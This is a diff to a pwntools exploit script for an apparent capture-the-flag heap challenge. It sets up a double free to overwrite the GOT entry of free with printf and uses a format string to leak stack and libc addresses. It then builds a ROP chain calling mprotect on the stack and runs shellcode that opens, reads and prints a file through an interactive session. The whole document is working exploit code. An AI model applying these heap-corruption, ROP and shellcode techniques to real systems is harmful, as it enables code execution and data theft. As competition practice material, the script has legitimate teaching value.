@@ -5,7 +5,7 @@
 from pwn import *
 
 # Set up pwntools for the correct architecture
-exe = context.binary = ELF('./chall')
+exe = context.binary = ELF('./chall_patched')
 context.arch='amd64'
 
 # Many built-in settings can be controlled on the command-line and show up
@@ -59,10 +59,7 @@ c
 io = start()
 secomp = 0x40154a
 
-if args.LOCAL:
-    libc = exe.libc
-else:
-    libc = ELF("./libc.so.6")
+libc = exe.libc
 
 def create(size,msg):
     io.sendlineafter("> ", "1")
@@ -75,64 +72,55 @@ def delete(idx):
 
 
 for _ in range(7):
-    create(0x18, 'A' * 8)
+    create(0x10, 'A' * 8) # 0 - 6
 
-create(0x18, 'A' * 8)
-create(0x18, 'A' * 8)
-#
+create(0x10, 'A' * 8) # 7
+create(0x10, 'A' * 8) # 8
+
 for i in range(7):
     delete(i)
 
 delete(7)
 delete(8)
 delete(7)
-#
-for _ in range(7):
-    create(0x18, 'A' * 8)
 
-create(0x18, p64(exe.got['free']).ljust(0x10,"a"))
-
-# print (hex(exe.got['free']))
-# print (p64(exe.got['free']))
 for _ in range(7):
-    create(0x70, 'B' * 8)
-#
-create(0x70, 'B' * 8)
-create(0x70, 'B' * 8)
-#
+    create(0x10, 'A' * 8) # 9 - 15
+
+for _ in range(7):
+    create(0x78, 'B' * 8) # 16 - 22
+
+create(0x78, 'B' * 8) # 23
+create(0x78, 'B' * 8) # 24
+
 for i in range(7):
-    delete(i + 17)
-#
-delete(17 + 7)
-delete(17 + 8)
-delete(17 + 7)
-#
-for _ in range(7):
-    create(0x70, 'B' * 8)
+    delete(i + 16)
 
-create(0x18, 'A' * 8)
-create(0x18, '%6$p||%21$p||EOF')
-create(0x18, p64(0x401150)) # elf.plt.printf
+delete(16 + 7)
+delete(16 + 8)
+delete(16 + 7)
 
-delete(34)
+create(0x18, p64(exe.got['free'])) # 25
+create(0x18, 'A' * 8) # 26
+create(0x18, '%6$p-%21$p-END') # 27
+create(0x18, p64(exe.plt['printf'])) # 28
 
-leaks = io.recvuntil(b'EOF', 1).split(b'||')
+delete(27)
+
+leaks = io.recvuntil(b'END', 1).split(b'-')
 stack = int(leaks[0], 16)
-if args.LOCAL:
-    libc.address = int(leaks[1], 16) - libc.sym['__libc_start_main'] - 234
-else :
-    libc.address = int(leaks[1], 16) - libc.sym['__libc_start_main'] - 243
-print ('STACK', hex(stack))
-print ('LIBC ', hex(libc.address))
-
-create(0x70, p64(stack - 56))
-create(0x70, 'C' * 8)
-create(0x70, 'C' * 8)
-#
-print (hex(stack))
+libc.address = int(leaks[1], 16) - libc.sym['__libc_start_main'] - 243
+print 'stack : ', hex(stack)
+print 'libc : ', hex(libc.address)
 stack_base = (stack & ~0xfff) - 0x1e000
+print "stack base : ", hex(stack_base)
 
-print "stack base", hex(stack_base)
+for _ in range(7):
+    create(0x78, 'B' * 8)
+
+create(0x78, p64(stack - 56))
+create(0x78, 'C' * 8)
+create(0x78, 'C' * 8)
 
 rop = ROP(libc)
 rop.call(libc.sym['mprotect'], [stack_base, 0x21000, 0x7])
@@ -149,26 +137,12 @@ mov rdx, 0x200
 xor rax, rax
 syscall
 '''
-# xor rax, rax
-# xor rdx, rdx
-# lea rdi, [rsp+8]
-# mov rdx, rsi
-# mov rsi, rdi
-# xor rdi, rdi
-# syscall
-
-# gdb.attach(io,'''
-# b *0x401470
-# b *0x401475
-# # c
-# ''')
 
 p = rop + p64(stack - 56 + len(rop)+ 8) + asm(shellcode)
 print "len rop :",len(rop)
 print "len payload :", len(p)
 assert p > 0x70
 
-# create(0x70, rop + p64(stack - 56 + 0x48 - 8) + asm(shellcode))
 create(0x70, p)
 
 shellcode = '''
@@ -184,15 +158,14 @@ shellcode += shellcraft.open('rsp', 0, 0)
 shellcode += shellcraft.read('rax', 'rsp', size)
 shellcode += shellcraft.write(1, 'rsp', size)
 
-
 shellcode = 'A' * 13 + asm(shellcode)
 
 io.sendline(shellcode)
 
-# io.recv(100)
-# io.recv()
-# data = io.recv()
-# data = dirents(data)
-# print data
+# # io.recv(100)
+# # io.recv()
+# # data = io.recv()
+# # data = dirents(data)
+# # print data
 
 io.interactive()
